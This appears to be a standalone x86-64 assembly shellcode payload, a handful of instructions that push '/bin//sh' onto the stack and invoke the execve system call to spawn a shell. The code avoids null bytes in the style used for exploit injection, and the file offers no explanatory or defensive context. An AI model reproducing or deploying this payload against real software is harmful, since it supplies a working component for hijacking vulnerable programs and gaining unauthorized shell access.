global _start

section .text
_start:
    push rdx
    xor rsi, rsi
    mov rbx,'/bin//sh'
    push rbx
    push rsp
    pop rdi
    mov al, 59
    syscall